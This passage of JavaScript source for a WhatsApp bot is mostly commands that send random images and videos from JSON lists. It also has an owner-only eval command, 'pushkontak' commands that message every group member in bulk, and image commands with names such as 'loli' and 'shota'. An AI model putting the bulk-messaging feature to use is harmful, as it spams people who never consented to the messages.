if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
TradzSigma.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'tiktokgirl':
  if (!isPrem) return replyprem(mess.premium)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
replyviex(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./library/data/TradMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replyviex("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replyviex(`Contoh ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Telah Melakukan AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replyviex('What wallpaper do you want?')
replyviex(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await TradzSigma.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})
break
case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      TradzSigma.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      TradzSigma.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      TradzSigma.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
case 'akira': case 'akiyama': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'gsga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
replyviex(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/yayaya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yayaashs.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
TradzSigma.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
if (!TradID) return reply(mess.only.owner)
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replyviex(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replyviex(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replyviex(util.format(_syntax + _err))
}
break
case 'pushkontak': {
if (!TradID) return replyviex(mess.only.owner)
if (!m.isGroup) return replyviex(mess.only.group)
if (!text) return replyviex("pesannya")
const teks = text
const jidawal = m.chat
const data = await TradzSigma.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await TradzSigma.sendMessage(mem, {text: teks}, {quoted: qloc })
await sleep(9000)
}}
await biyu.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break
case 'pushkontakv2':{
if (!TradID) return reply(mess.only.owner)
if (!q) return replyviex(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
replyviex(mess.wait)
const metadata2 = await TradzSigma.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
TradzSigma.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replyviex(`Success`)
}
break
case 'pushkontakv3': {
if (!TradID) return reply(`Khusus Owner Aja`)
